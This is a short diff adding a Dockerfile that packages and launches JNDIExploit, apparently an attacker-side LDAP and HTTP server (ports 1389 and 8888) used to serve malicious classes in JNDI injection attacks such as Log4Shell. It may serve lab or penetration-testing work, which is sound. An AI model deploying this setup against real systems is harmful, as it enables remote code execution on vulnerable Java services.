@@ -1,0 +1,8 @@
+FROM openjdk:8
+ARG IP
+ENV ENV_IP = $IP
+
+WORKDIR /
+ADD JNDIExploit-1.2-SNAPSHOT.jar JNDIExploit-1.2-SNAPSHOT.jar
+EXPOSE 8888 1389
+CMD java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $ENV_IP -p 8888
